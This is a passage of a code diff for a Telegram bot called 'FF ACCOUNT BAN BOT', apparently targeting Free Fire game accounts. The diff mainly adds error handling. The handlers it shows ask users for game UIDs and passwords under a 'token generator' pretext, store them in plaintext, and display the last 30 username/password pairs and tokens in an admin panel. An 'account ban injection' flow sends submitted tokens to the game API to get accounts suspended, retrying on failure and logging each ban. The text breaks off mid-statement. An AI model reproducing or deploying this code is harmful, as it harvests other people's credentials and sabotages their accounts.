@@ -9,6 +9,7 @@ import requests
 import urllib3
 import urllib.parse
 import sqlite3
+import logging
 from datetime import datetime
 
 from telegram import (
@@ -19,6 +20,7 @@ from telegram.ext import (
     Application, CommandHandler, MessageHandler, CallbackQueryHandler,
     ContextTypes, filters
 )
+from telegram.error import Forbidden, BadRequest, TelegramError
 
 urllib3.disable_warnings()
 
@@ -450,10 +452,15 @@ def run_with_loader_sync(func, text="PROCESSING"):
 async def animated_loader(update: Update, text="PROCESSING"):
     spinner = ['⏳', '⌛', '⏳', '⌛']
     bar_length = 18
-    msg = await update.message.reply_text(
-        f"⏳ *{text}*\n`[░░░░░░░░░░░░░░░░░░]` 0%",
-        parse_mode="Markdown"
-    )
+    msg = None
+    try:
+        msg = await update.message.reply_text(
+            f"⏳ *{text}*\n`[░░░░░░░░░░░░░░░░░░]` 0%",
+            parse_mode="Markdown"
+        )
+    except Exception:
+        return None
+
     i = 0.0
     spin_idx = 0
     while i < 100:
@@ -578,501 +585,547 @@ HELP_TEXT = (
 
 # ================== TELEGRAM HANDLERS ==================
 async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    context.user_data["state"] = None
+    try:
+        user = update.effective_user
+        context.user_data["state"] = None
 
-    # ✅ Force Join (প্রথমবার হলে)
-    if user.id not in VERIFIED_USERS and not is_admin(user.id):
+        # ✅ Force Join (প্রথমবার হলে)
+        if user.id not in VERIFIED_USERS and not is_admin(user.id):
+            await update.message.reply_text(
+                f"👋 *Welcome {user.first_name}!*\n\n"
+                f"🔒 *To use this bot, please join our Channel and Group first.*\n\n"
+                f"1️⃣ Join the Channel\n"
+                f"2️⃣ Join the Group\n"
+                f"3️⃣ Tap ✅ VERIFY\n\n"
+                f"📢 Channel: {CHANNEL_NAME}\n"
+                f"👥 Group: {GROUP_NAME}",
+                parse_mode="Markdown",
+                reply_markup=force_join_keyboard()
+            )
+            return
+
+        # Admin / Verified user → সরাসরি মেইন মেনু
         await update.message.reply_text(
-            f"👋 *Welcome {user.first_name}!*\n\n"
-            f"🔒 *To use this bot, please join our Channel and Group first.*\n\n"
-            f"1️⃣ Join the Channel\n"
-            f"2️⃣ Join the Group\n"
-            f"3️⃣ Tap ✅ VERIFY\n\n"
-            f"📢 Channel: {CHANNEL_NAME}\n"
-            f"👥 Group: {GROUP_NAME}",
+            f"👋 *স্বাগতম {user.first_name}!*\n\n"
+            f"🤖 *FF ACCOUNT BAN BOT*\n"
+            f"👨‍💻 Developer: *YASIN BHAI*\n\n"
+            f"নিচের বাটন থেকে অপশন সিলেক্ট করুন 👇",
             parse_mode="Markdown",
-            reply_markup=force_join_keyboard()
+            reply_markup=main_reply_keyboard(is_admin(user.id))
         )
-        return
-
-    # Admin / Verified user → সরাসরি মেইন মেনু
-    await update.message.reply_text(
-        f"👋 *স্বাগতম {user.first_name}!*\n\n"
-        f"🤖 *FF ACCOUNT BAN BOT*\n"
-        f"👨‍💻 Developer: *YASIN BHAI*\n\n"
-        f"নিচের বাটন থেকে অপশন সিলেক্ট করুন 👇",
-        parse_mode="Markdown",
-        reply_markup=main_reply_keyboard(is_admin(user.id))
-    )
+    except Forbidden:
+        pass
+    except Exception as e:
+        print(f"Error in start_cmd: {e}")
 
 
 async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    context.user_data["state"] = None
-
-    # ✅ CANCEL message (বাংলা লেখা সরানো হয়েছে)
-    await update.message.reply_text(
-        "👋",
-        reply_markup=main_reply_keyboard(is_admin(user.id))
-    )
-
-
-async def verify_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """✅ VERIFY বাটনে ক্লিক করলে মেইন মেনু দেখাবে।"""
-    query = update.callback_query
-    await query.answer()
-    user = query.from_user
-
-    VERIFIED_USERS.add(user.id)
-
     try:
-        await query.message.delete()
-    except Exception:
-        pass
-
-    await query.message.reply_text(
-        f"✅ *Verification Successful!*\n\n"
-        f"👋 Welcome {user.first_name}!\n\n"
-        f"🤖 *FF ACCOUNT BAN BOT*\n"
-        f"👨‍💻 Developer: *YASIN BHAI*\n\n"
-        f"নিচের বাটন থেকে অপশন সিলেক্ট করুন 👇",
-        parse_mode="Markdown",
-        reply_markup=main_reply_keyboard(is_admin(user.id))
-    )
-
-
-async def show_admin_panel_msg(update: Update):
-    j, jt, a, b = db_count()
-    keyboard = [
-        [InlineKeyboardButton(f"🔑  JWT Creds  ({j})  ", callback_data="admin_jwt")],
-        [InlineKeyboardButton(f"🎫  JWT Tokens  ({jt})  ", callback_data="admin_jwt_tokens")],
-        [InlineKeyboardButton(f"🔐  Access Tokens  ({a})  ", callback_data="admin_access")],
-        [InlineKeyboardButton(f"💀  Ban Logs  ({b})  ", callback_data="admin_ban")],
-        [InlineKeyboardButton("🔙  Back  ", callback_data="admin_back")],
-    ]
-    await update.message.reply_text(
-        "🛠 *ADMIN PANEL*\n\n"
-        "নিচের যেকোনো সেকশনে ক্লিক করুন 👇",
-        parse_mode="Markdown",
-        reply_markup=InlineKeyboardMarkup(keyboard)
-    )
-
-
-async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    user = query.from_user
-    if not is_admin(user.id):
-        await query.message.reply_text("⛔ আপনি Admin নন।")
-        return
-
-    data = query.data
-
-    if data == "admin_back":
-        try:
-            await query.message.delete()
-        except Exception:
-            pass
-        await query.message.reply_text(
-            "🏠 *মেইন মেনু*\n\nনিচের বাটন থেকে অপশন সিলেক্ট করুন 👇",
-            parse_mode="Markdown",
-            reply_markup=main_reply_keyboard(True)
-        )
-        return
-
-    if data == "admin_jwt":
-        rows = db_get_jwt_creds(30)
-        if not rows:
-            await query.message.reply_text("📭 কোনো JWT Creds নেই।")
-            return
-        txt = "🔑 *Last 30 JWT Credentials (UID + Password)*\n\n"
-        for r in rows:
-            uid, pw, region, by, at = r
-            txt += (
-                f"👤 *UID:* `{uid}`\n"
-                f"🔒 *Password:* `{pw}`\n"
-                f"🌍 *Region:* `{region}`\n"
-                f"🆔 *By:* `{by}`\n"
-                f"🕒 *At:* {at}\n"
-                f"━━━━━━━━━━━━━━━━━━━━\n"
-            )
-        for chunk in [txt[i:i+3900] for i in range(0, len(txt), 3900)]:
-            await query.message.reply_text(chunk, parse_mode="Markdown")
-
-    elif data == "admin_jwt_tokens":
-        rows = db_get_jwt_tokens(30)
-        if not rows:
-            await query.message.reply_text("📭 কোনো JWT Tokens নেই।")
-            return
-        txt = "🎫 *Last 30 JWT Tokens*\n\n"
-        for r in rows:
-            token, nick, acc, region, by, at = r
-            txt += (
-                f"👤 *Nick:* `{nick}`\n"
-                f"🆔 *Acc:* `{acc}`\n"
-                f"🌍 *Region:* `{region}`\n"
-                f"🎫 *JWT Token:* `{token[:60]}...`\n"
-                f"🆔 *By:* `{by}`\n"
-                f"🕒 *At:* {at}\n"
-                f"━━━━━━━━━━━━━━━━━━━━\n"
-            )
-        for chunk in [txt[i:i+3900] for i in range(0, len(txt), 3900)]:
-            await query.message.reply_text(chunk, parse_mode="Markdown")
-
-    elif data == "admin_access":
-        rows = db_get_access_tokens(30)
-        if not rows:
-            await query.message.reply_text("📭 কোনো Access Tokens নেই।")
-            return
-        txt = "🔐 *Last 30 Access Tokens*\n\n"
-        for r in rows:
-            token, nick, acc, region, by, at = r
-            txt += (
-                f"👤 *Nick:* `{nick}`\n"
-                f"🆔 *Acc:* `{acc}`\n"
-                f"🌍 *Region:* `{region}`\n"
-                f"🔐 *Access Token:* `{token[:60]}...`\n"
-                f"🆔 *By:* `{by}`\n"
-                f"🕒 *At:* {at}\n"
-                f"━━━━━━━━━━━━━━━━━━━━\n"
-            )
-        for chunk in [txt[i:i+3900] for i in range(0, len(txt), 3900)]:
-            await query.message.reply_text(chunk, parse_mode="Markdown")
-
-    elif data == "admin_ban":
-        rows = db_get_ban_logs(30)
-        if not rows:
-            await query.message.reply_text("📭 কোনো Ban Logs নেই।")
-            return
-        txt = "💀 *Last 30 Ban Logs*\n\n"
-        for r in rows:
-            acc, nick, region, version, status, by, at = r
-            txt += (
-                f"👤 *Nick:* `{nick}`\n"
-                f"🆔 *Acc:* `{acc}`\n"
-                f"🌍 *Region:* `{region}`\n"
-                f"📦 *Ver:* `{version}`\n"
-                f"📊 *Status:* `{status}`\n"
-                f"🆔 *By:* `{by}`\n"
-                f"🕒 *At:* {at}\n"
-                f"━━━━━━━━━━━━━━━━━━━━\n"
-            )
-        for chunk in [txt[i:i+3900] for i in range(0, len(txt), 3900)]:
-            await query.message.reply_text(chunk, parse_mode="Markdown")
-
-
-async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    text = update.message.text.strip()
-    state = context.user_data.get("state")
-
-    # ---------- Force Join check (Verify ছাড়া কিছুই কাজ করবে না) ----------
-    if user.id not in VERIFIED_USERS and not is_admin(user.id):
-        await update.message.reply_text(
-            "🔒 *Please verify first!*\n\n"
-            "Join our Channel and Group, then tap ✅ VERIFY.",
-            parse_mode="Markdown",
-            reply_markup=force_join_keyboard()
-        )
-        return
-    # ---------- End Force Join ----------
-
-    # ---------- CANCEL Button ----------
-    if text == "❌ CANCEL":
+        user = update.effective_user
         context.user_data["state"] = None
-        try:
-            await update.message.delete()
-        except Exception:
-            pass
-        # ✅ বাংলা লেখা সরানো, শুধু 👋 ইমোজি
+
         await update.message.reply_text(
             "👋",
             reply_markup=main_reply_keyboard(is_admin(user.id))
         )
-        return
-    # ---------- End CANCEL ----------
+    except Forbidden:
+        pass
+    except Exception as e:
+        print(f"Error in cancel_cmd: {e}")
 
-    # ---------- Reply Keyboard Button Detection ----------
-    if text == "🔑 JWT TOKEN GENERATE":
-        context.user_data["state"] = "await_jwt_creds"
-        await update.message.reply_text(
-            "🔑 *JWT TOKEN GENERATOR*\n\n"
-            "📝 ফরম্যাট:\n`UID PASSWORD`\n\n"
-            "📌 উদাহরণ:\n`18301016398 mypassword123`\n\n"
-            "➡️ বাতিল করতে নিচের ❌ CANCEL বাটন চাপুন।",
-            parse_mode="Markdown",
-            reply_markup=cancel_only_keyboard()
-        )
-        return
 
-    if text == "💀 ACCOUNT BAN":
-        context.user_data["state"] = "await_access_token"
-        await update.message.reply_text(
-            "💀 *ACCOUNT BAN INJECTION*\n\n"
-            "📝 আপনার Access Token অথবা JWT Token পাঠান।\n\n"
-            "➡️ বাতিল করতে নিচের ❌ CANCEL বাটন চাপুন।",
-            parse_mode="Markdown",
-            reply_markup=cancel_only_keyboard()
-        )
-        return
+async def verify_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    try:
+        await query.answer()
+        user = query.from_user
 
-    if text == "ℹ️ HELP":
-        # ✅ HELP message চালু
-        await update.message.reply_text(
-            HELP_TEXT,
-            parse_mode="Markdown",
-            disable_web_page_preview=True,
-            reply_markup=main_reply_keyboard(is_admin(user.id))
-        )
-        return
-
-    if text == "🛠 ADMIN PANEL":
-        if not is_admin(user.id):
-            await update.message.reply_text("⛔ আপনি Admin নন।")
-            return
-        await show_admin_panel_msg(update)
-        return
-    # ---------- End Reply Keyboard Detection ----------
-
-    if not state:
-        await update.message.reply_text(
-            "ℹ️ শুরু করতে /start দিন অথবা নিচের বাটন ব্যবহার করুন।",
-            reply_markup=main_reply_keyboard(is_admin(user.id))
-        )
-        return
-
-    # ================== JWT GENERATE ==================
-    if state == "await_jwt_creds":
-        parts = text.split(maxsplit=1)
-        if len(parts) < 2:
-            await update.message.reply_text("❌ ফরম্যাট ভুল। `UID PASSWORD` দিন।", parse_mode="Markdown")
-            return
-        uid, password = parts[0].strip(), parts[1].strip()
-
-        api_result = {"token": None, "error": None}
-
-        def call_api():
-            tok, err = generate_jwt_api(uid, password)
-            api_result["token"] = tok
-            api_result["error"] = err
-
-        api_thread = threading.Thread(target=call_api)
-        api_thread.start()
-
-        loader_msg = await animated_loader(update, "GENERATING JWT TOKEN")
-
-        while api_thread.is_alive():
-            await asyncio.sleep(0.1)
-
-        token = api_result["token"]
-        error = api_result["error"]
-
-        if not token:
-            await loader_msg.edit_text(f"❌ টোকেন জেনারেট ব্যর্থ:\n`{error}`", parse_mode="Markdown")
-            context.user_data["state"] = None
-            await update.message.reply_text(
-                "🏠 *মেইন মেনু*",
-                parse_mode="Markdown",
-                reply_markup=main_reply_keyboard(is_admin(user.id))
-            )
-            return
-
-        user_data = decode_jwt(token)
-        region = user_data.get('lock_region') or user_data.get('region') or 'N/A'
-
-        db_insert_jwt_cred(uid, password, region, str(user.id))
-
-        await loader_msg.edit_text(
-            f"✅ *TOKEN GENERATED SUCCESSFULLY*\n\n"
-            f"🆔 UID: `{uid}`\n"
-            f"🌍 Region: `{region}`\n"
-            f"👤 Owner: *YASIN BHAI*\n\n"
-            f"🔑 *Token:*\n`{token}`",
-            parse_mode="Markdown"
-        )
-        context.user_data["state"] = None
-        await update.message.reply_text(
-            "🏠 *মেইন মেনু*",
-            parse_mode="Markdown",
-            reply_markup=main_reply_keyboard(is_admin(user.id))
-        )
-
-    # ================== ACCOUNT BAN ==================
-    elif state == "await_access_token":
-        input_is_jwt = is_jwt_format(text)
-
-        auth_result = {"jwt": None, "err": None}
-
-        def do_auth():
-            r, e = fetch_majorlogin_jwt(text)
-            if isinstance(r, tuple):
-                r = r[0]
-            auth_result["jwt"] = r
-            auth_result["err"] = e
-
-        auth_thread = threading.Thread(target=do_auth)
-        auth_thread.start()
-
-        loader_msg = await animated_loader(update, "AUTHENTICATING")
-        while auth_thread.is_alive():
-            await asyncio.sleep(0.1)
-
-        jwt_token = auth_result["jwt"]
-        err = auth_result["err"]
-
-        if err or not jwt_token:
-            try:
-                await loader_msg.delete()
-            except Exception:
-                pass
-            await update.message.reply_text(f"❌ Authentication Failed:\n`{err}`", parse_mode="Markdown")
-            context.user_data["state"] = None
-            await update.message.reply_text(
-                "🏠 *মেইন মেনু*",
-                parse_mode="Markdown",
-                reply_markup=main_reply_keyboard(is_admin(user.id))
-            )
-            return
-
-        user_data = decode_jwt(jwt_token)
-        raw_nick = user_data.get('nickname', '')
-        nickname = decode_ff_name(raw_nick)
-        region = user_data.get('lock_region', user_data.get('region', 'IND'))
-        account_id = user_data.get('account_id', 'Unknown')
-        version = user_data.get('release_version', 'Latest')
-        base_url = get_base_url(region)
-
-        if input_is_jwt:
-            db_insert_jwt_token(text, nickname, account_id, region, str(user.id))
-        else:
-            db_insert_access_token(text, nickname, account_id, region, str(user.id))
+        VERIFIED_USERS.add(user.id)
 
         try:
-            await loader_msg.delete()
+            await query.message.delete()
         except Exception:
             pass
 
-        first_msg = await update.message.reply_text(
-            f"✅ *TOKEN VALIDATED | TARGET ACQUIRED*\n\n"
-            f"👤 Nickname: `{nickname}`\n"
-            f"🆔 Account ID: `{account_id}`\n"
-            f"🌍 Region: `{region}`\n"
-            f"📦 Patch Ver: `{version}`\n\n"
-            f"⏳ *Ban Injecting...*",
-            parse_mode="Markdown"
+        await query.message.reply_text(
+            f"✅ *Verification Successful!*\n\n"
+            f"👋 Welcome {user.first_name}!\n\n"
+            f"🤖 *FF ACCOUNT BAN BOT*\n"
+            f"👨‍💻 Developer: *YASIN BHAI*\n\n"
+            f"নিচের বাটন থেকে অপশন সিলেক্ট করুন 👇",
+            parse_mode="Markdown",
+            reply_markup=main_reply_keyboard(is_admin(user.id))
         )
+    except Forbidden:
+        pass
+    except Exception as e:
+        print(f"Error in verify_callback: {e}")
 
-        inject_result = {"resp": None, "err": None}
 
-        def do_inject():
+async def show_admin_panel_msg(update: Update):
+    try:
+        j, jt, a, b = db_count()
+        keyboard = [
+            [InlineKeyboardButton(f"🔑  JWT Creds  ({j})  ", callback_data="admin_jwt")],
+            [InlineKeyboardButton(f"🎫  JWT Tokens  ({jt})  ", callback_data="admin_jwt_tokens")],
+            [InlineKeyboardButton(f"🔐  Access Tokens  ({a})  ", callback_data="admin_access")],
+            [InlineKeyboardButton(f"💀  Ban Logs  ({b})  ", callback_data="admin_ban")],
+            [InlineKeyboardButton("🔙  Back  ", callback_data="admin_back")],
+        ]
+        await update.message.reply_text(
+            "🛠 *ADMIN PANEL*\n\n"
+            "নিচের যেকোনো সেকশনে ক্লিক করুন 👇",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+    except Forbidden:
+        pass
+    except Exception as e:
+        print(f"Error in show_admin_panel_msg: {e}")
+
+
+async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    try:
+        await query.answer()
+        user = query.from_user
+        if not is_admin(user.id):
+            await query.message.reply_text("⛔ আপনি Admin নন।")
+            return
+
+        data = query.data
+
+        if data == "admin_back":
             try:
-                r = trigger_injection(jwt_token, version, base_url)
-                inject_result["resp"] = r
-            except Exception as e:
-                inject_result["err"] = e
-
-        inject_thread = threading.Thread(target=do_inject)
-        inject_thread.start()
-
-        inject_msg = await animated_loader(update, "INJECTING API")
-        while inject_thread.is_alive():
-            await asyncio.sleep(0.1)
-
-        resp = inject_result["resp"]
-        err2 = inject_result["err"]
-
-        if err2 or resp is None:
-            try:
-                await first_msg.delete()
+                await query.message.delete()
             except Exception:
                 pass
-            try:
-                await inject_msg.delete()
-            except Exception:
-                pass
-            await update.message.reply_text(
-                f"❌ Injection Failed:\n`{err2}`",
-                parse_mode="Markdown"
-            )
-            context.user_data["state"] = None
-            await update.message.reply_text(
-                "🏠 *মেইন মেনু*",
+            await query.message.reply_text(
+                "🏠 *মেইন মেনু*\n\nনিচের বাটন থেকে অপশন সিলেক্ট করুন 👇",
                 parse_mode="Markdown",
+                reply_markup=main_reply_keyboard(True)
+            )
+            return
+
+        if data == "admin_jwt":
+            rows = db_get_jwt_creds(30)
+            if not rows:
+                await query.message.reply_text("📭 কোনো JWT Creds নেই।")
+                return
+            txt = "🔑 *Last 30 JWT Credentials (UID + Password)*\n\n"
+            for r in rows:
+                uid, pw, region, by, at = r
+                txt += (
+                    f"👤 *UID:* `{uid}`\n"
+                    f"🔒 *Password:* `{pw}`\n"
+                    f"🌍 *Region:* `{region}`\n"
+                    f"🆔 *By:* `{by}`\n"
+                    f"🕒 *At:* {at}\n"
+                    f"━━━━━━━━━━━━━━━━━━━━\n"
+                )
+            for chunk in [txt[i:i+3900] for i in range(0, len(txt), 3900)]:
+                await query.message.reply_text(chunk, parse_mode="Markdown")
+
+        elif data == "admin_jwt_tokens":
+            rows = db_get_jwt_tokens(30)
+            if not rows:
+                await query.message.reply_text("📭 কোনো JWT Tokens নেই।")
+                return
+            txt = "🎫 *Last 30 JWT Tokens*\n\n"
+            for r in rows:
+                token, nick, acc, region, by, at = r
+                txt += (
+                    f"👤 *Nick:* `{nick}`\n"
+                    f"🆔 *Acc:* `{acc}`\n"
+                    f"🌍 *Region:* `{region}`\n"
+                    f"🎫 *JWT Token:* `{token[:60]}...`\n"
+                    f"🆔 *By:* `{by}`\n"
+                    f"🕒 *At:* {at}\n"
+                    f"━━━━━━━━━━━━━━━━━━━━\n"
+                )
+            for chunk in [txt[i:i+3900] for i in range(0, len(txt), 3900)]:
+                await query.message.reply_text(chunk, parse_mode="Markdown")
+
+        elif data == "admin_access":
+            rows = db_get_access_tokens(30)
+            if not rows:
+                await query.message.reply_text("📭 কোনো Access Tokens নেই।")
+                return
+            txt = "🔐 *Last 30 Access Tokens*\n\n"
+            for r in rows:
+                token, nick, acc, region, by, at = r
+                txt += (
+                    f"👤 *Nick:* `{nick}`\n"
+                    f"🆔 *Acc:* `{acc}`\n"
+                    f"🌍 *Region:* `{region}`\n"
+                    f"🔐 *Access Token:* `{token[:60]}...`\n"
+                    f"🆔 *By:* `{by}`\n"
+                    f"🕒 *At:* {at}\n"
+                    f"━━━━━━━━━━━━━━━━━━━━\n"
+                )
+            for chunk in [txt[i:i+3900] for i in range(0, len(txt), 3900)]:
+                await query.message.reply_text(chunk, parse_mode="Markdown")
+
+        elif data == "admin_ban":
+            rows = db_get_ban_logs(30)
+            if not rows:
+                await query.message.reply_text("📭 কোনো Ban Logs নেই।")
+                return
+            txt = "💀 *Last 30 Ban Logs*\n\n"
+            for r in rows:
+                acc, nick, region, version, status, by, at = r
+                txt += (
+                    f"👤 *Nick:* `{nick}`\n"
+                    f"🆔 *Acc:* `{acc}`\n"
+                    f"🌍 *Region:* `{region}`\n"
+                    f"📦 *Ver:* `{version}`\n"
+                    f"📊 *Status:* `{status}`\n"
+                    f"🆔 *By:* `{by}`\n"
+                    f"🕒 *At:* {at}\n"
+                    f"━━━━━━━━━━━━━━━━━━━━\n"
+                )
+            for chunk in [txt[i:i+3900] for i in range(0, len(txt), 3900)]:
+                await query.message.reply_text(chunk, parse_mode="Markdown")
+    except Forbidden:
+        pass
+    except Exception as e:
+        print(f"Error in admin_callback: {e}")
+
+
+async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        user = update.effective_user
+        text = update.message.text.strip()
+        state = context.user_data.get("state")
+
+        # ---------- Force Join check ----------
+        if user.id not in VERIFIED_USERS and not is_admin(user.id):
+            await update.message.reply_text(
+                "🔒 *Please verify first!*\n\n"
+                "Join our Channel and Group, then tap ✅ VERIFY.",
+                parse_mode="Markdown",
+                reply_markup=force_join_keyboard()
+            )
+            return
+
+        if text == "❌ CANCEL":
+            context.user_data["state"] = None
+            try:
+                await update.message.delete()
+            except Exception:
+                pass
+            await update.message.reply_text(
+                "👋",
                 reply_markup=main_reply_keyboard(is_admin(user.id))
             )
             return
 
-        retry_count = 0
-        while resp.status_code != 200 and retry_count < 3:
-            retry_count += 1
+        if text == "🔑 JWT TOKEN GENERATE":
+            context.user_data["state"] = "await_jwt_creds"
+            await update.message.reply_text(
+                "🔑 *JWT TOKEN GENERATOR*\n\n"
+                "📝 ফরম্যাট:\n`UID PASSWORD`\n\n"
+                "📌 উদাহরণ:\n`18301016398 mypassword123`\n\n"
+                "➡️ বাতিল করতে নিচের ❌ CANCEL বাটন চাপুন।",
+                parse_mode="Markdown",
+                reply_markup=cancel_only_keyboard()
+            )
+            return
 
-            retry_result = {"resp": None, "err": None}
+        if text == "💀 ACCOUNT BAN":
+            context.user_data["state"] = "await_access_token"
+            await update.message.reply_text(
+                "💀 *ACCOUNT BAN INJECTION*\n\n"
+                "📝 আপনার Access Token অথবা JWT Token পাঠান।\n\n"
+                "➡️ বাতিল করতে নিচের ❌ CANCEL বাটন চাপুন।",
+                parse_mode="Markdown",
+                reply_markup=cancel_only_keyboard()
+            )
+            return
 
-            def do_inject_retry():
-                try:
-                    retry_result["resp"] = trigger_injection(jwt_token, version, base_url)
-                except Exception as e:
-                    retry_result["err"] = e
+        if text == "ℹ️ HELP":
+            await update.message.reply_text(
+                HELP_TEXT,
+                parse_mode="Markdown",
+                disable_web_page_preview=True,
+                reply_markup=main_reply_keyboard(is_admin(user.id))
+            )
+            return
 
-            retry_thread = threading.Thread(target=do_inject_retry)
-            retry_thread.start()
+        if text == "🛠 ADMIN PANEL":
+            if not is_admin(user.id):
+                await update.message.reply_text("⛔ আপনি Admin নন।")
+                return
+            await show_admin_panel_msg(update)
+            return
 
-            retry_msg = await animated_loader(update, f"RETRY {retry_count}")
-            while retry_thread.is_alive():
+        if not state:
+            await update.message.reply_text(
+                "ℹ️ শুরু করতে /start দিন অথবা নিচের বাটন ব্যবহার করুন।",
+                reply_markup=main_reply_keyboard(is_admin(user.id))
+            )
+            return
+
+        # ================== JWT GENERATE ==================
+        if state == "await_jwt_creds":
+            parts = text.split(maxsplit=1)
+            if len(parts) < 2:
+                await update.message.reply_text("❌ ফরম্যাট ভুল। `UID PASSWORD` দিন।", parse_mode="Markdown")
+                return
+            uid, password = parts[0].strip(), parts[1].strip()
+
+            api_result = {"token": None, "error": None}
+
+            def call_api():
+                tok, err = generate_jwt_api(uid, password)
+                api_result["token"] = tok
+                api_result["error"] = err
+
+            api_thread = threading.Thread(target=call_api)
+            api_thread.start()
+
+            loader_msg = await animated_loader(update, "GENERATING JWT TOKEN")
+
+            while api_thread.is_alive():
                 await asyncio.sleep(0.1)
 
-            resp = retry_result["resp"]
-            err2 = retry_result["err"]
+            token = api_result["token"]
+            error = api_result["error"]
+
+            if not token:
+                if loader_msg:
+                    try:
+                        await loader_msg.edit_text(f"❌ টোকেন জেনারেট ব্যর্থ:\n`{error}`", parse_mode="Markdown")
+                    except Exception:
+                        pass
+                context.user_data["state"] = None
+                await update.message.reply_text(
+                    "🏠 *মেইন মেনু*",
+                    parse_mode="Markdown",
+                    reply_markup=main_reply_keyboard(is_admin(user.id))
+                )
+                return
+
+            user_data = decode_jwt(token)
+            region = user_data.get('lock_region') or user_data.get('region') or 'N/A'
+
+            db_insert_jwt_cred(uid, password, region, str(user.id))
+
+            if loader_msg:
+                try:
+                    await loader_msg.edit_text(
+                        f"✅ *TOKEN GENERATED SUCCESSFULLY*\n\n"
+                        f"🆔 UID: `{uid}`\n"
+                        f"🌍 Region: `{region}`\n"
+                        f"👤 Owner: *YASIN BHAI*\n\n"
+                        f"🔑 *Token:*\n`{token}`",
+                        parse_mode="Markdown"
+                    )
+                except Exception:
+                    pass
+
+            context.user_data["state"] = None
+            await update.message.reply_text(
+                "🏠 *মেইন মেনু*",
+                parse_mode="Markdown",
+                reply_markup=main_reply_keyboard(is_admin(user.id))
+            )
+
+        # ================== ACCOUNT BAN ==================
+        elif state == "await_access_token":
+            input_is_jwt = is_jwt_format(text)
+
+            auth_result = {"jwt": None, "err": None}
+
+            def do_auth():
+                r, e = fetch_majorlogin_jwt(text)
+                if isinstance(r, tuple):
+                    r = r[0]
+                auth_result["jwt"] = r
+                auth_result["err"] = e
+
+            auth_thread = threading.Thread(target=do_auth)
+            auth_thread.start()
+
+            loader_msg = await animated_loader(update, "AUTHENTICATING")
+            while auth_thread.is_alive():
+                await asyncio.sleep(0.1)
+
+            jwt_token = auth_result["jwt"]
+            err = auth_result["err"]
+
+            if err or not jwt_token:
+                if loader_msg:
+                    try:
+                        await loader_msg.delete()
+                    except Exception:
+                        pass
+                await update.message.reply_text(f"❌ Authentication Failed:\n`{err}`", parse_mode="Markdown")
+                context.user_data["state"] = None
+                await update.message.reply_text(
+                    "🏠 *মেইন মেনু*",
+                    parse_mode="Markdown",
+                    reply_markup=main_reply_keyboard(is_admin(user.id))
+                )
+                return
+
+            user_data = decode_jwt(jwt_token)
+            raw_nick = user_data.get('nickname', '')
+            nickname = decode_ff_name(raw_nick)
+            region = user_data.get('lock_region', user_data.get('region', 'IND'))
+            account_id = user_data.get('account_id', 'Unknown')
+            version = user_data.get('release_version', 'Latest')
+            base_url = get_base_url(region)
+
+            if input_is_jwt:
+                db_insert_jwt_token(text, nickname, account_id, region, str(user.id))
+            else:
+                db_insert_access_token(text, nickname, account_id, region, str(user.id))
+
+            if loader_msg:
+                try:
+                    await loader_msg.delete()
+                except Exception:
+                    pass
+
+            first_msg = await update.message.reply_text(
+                f"✅ *TOKEN VALIDATED | TARGET ACQUIRED*\n\n"
+                f"👤 Nickname: `{nickname}`\n"
+                f"🆔 Account ID: `{account_id}`\n"
+                f"🌍 Region: `{region}`\n"
+                f"📦 Patch Ver: `{version}`\n\n"
+                f"⏳ *Ban Injecting...*",
+                parse_mode="Markdown"
+            )
+
+            inject_result = {"resp": None, "err": None}
+
+            def do_inject():
+                try:
+                    r = trigger_injection(jwt_token, version, base_url)
+                    inject_result["resp"] = r
+                except Exception as e:
+                    inject_result["err"] = e
+
+            inject_thread = threading.Thread(target=do_inject)
+            inject_thread.start()
+
+            inject_msg = await animated_loader(update, "INJECTING API")
+            while inject_thread.is_alive():
+                await asyncio.sleep(0.1)
+
+            resp = inject_result["resp"]
+            err2 = inject_result["err"]
+
             if err2 or resp is None:
-                break
-            try:
-                await retry_msg.delete()
-            except Exception:
-                pass
+                if first_msg:
+                    try:
+                        await first_msg.delete()
+                    except Exception:
+                        pass
+                if inject_msg:
+                    try:
+                        await inject_msg.delete()
+                    except Exception:
+                        pass
+                await update.message.reply_text(
+                    f"❌ Injection Failed:\n`{err2}`",
+                    parse_mode="Markdown"
+                )
+                context.user_data["state"] = None
+                await update.message.reply_text(
+                    "🏠 *মেইন মেনু*",
+                    parse_mode="Markdown",
+                    reply_markup=main_reply_keyboard(is_admin(user.id))
+                )
+                return
 
-        try:
-            await first_msg.delete()
-        except Exception:
-            pass
-        try:
-            await inject_msg.delete()
-        except Exception:
-            pass
+            retry_count = 0
+            while resp.status_code != 200 and retry_count < 3:
+                retry_count += 1
 
-        if resp is not None and resp.status_code == 200:
-            ban_check = "✅ YES — Account is BANNED"
-        else:
-            ban_check = "❌ NO — Account is NOT banned"
+                retry_result = {"resp": None, "err": None}
 
-        if resp is not None and resp.status_code == 200:
-            db_insert_ban_log(account_id, nickname, region, version, "SUSPENDED (100%)", str(user.id))
+                def do_inject_retry():
+                    try:
+                        retry_result["resp"] = trigger_injection(jwt_token, version, base_url)
+                    except Exception as e:
+                        retry_result["err"] = e
+
+                retry_thread = threading.Thread(target=do_inject_retry)
+                retry_thread.start()
+
+                retry_msg = await animated_loader(update, f"RETRY {retry_count}")
+                while retry_thread.is_alive():
+                    await asyncio.sleep(0.1)
+
+                resp = retry_result["resp"]
+                err2 = retry_result["err"]
+                if err2 or resp is None:
+                    break
+                if retry_msg:
+                    try:
+                        await retry_msg.delete()
+                    except Exception:
+                        pass
+
+            if first_msg:
+                try:
+                    await first_msg.delete()
+                except Exception:
+                    pass
+            if inject_msg:
+                try:
+                    await inject_msg.delete()
+                except Exception:
+                    pass
+
+            if resp is not None and resp.status_code == 200:
+                ban_check = "✅ YES — Account is BANNED"
+            else:
+                ban_check = "❌ NO — Account is NOT banned"
+
+            if resp is not None and resp.status_code == 200:
